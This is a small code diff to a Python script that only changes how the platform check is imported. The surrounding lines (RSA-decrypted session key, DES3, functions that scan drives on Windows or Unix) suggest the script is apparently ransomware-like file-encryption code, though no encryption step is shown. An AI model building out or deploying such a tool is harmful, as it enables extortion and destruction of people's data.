@@ -6,7 +6,7 @@
 
 import os
 import argparse
-import platform
+from platform import system
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import DES3, PKCS1_OAEP
 
@@ -37,7 +37,8 @@ def init():
     session_key = cipher_rsa.decrypt(secret_key).decode('utf-8')
     print("_______________________________")
     print("Keys Initialised...Get Psyched!")
-    if platform.system() == "Windows":
+
+    if system() == "Windows":
         drive_to_scan_win()
     else:
         drive_to_scan_nix()
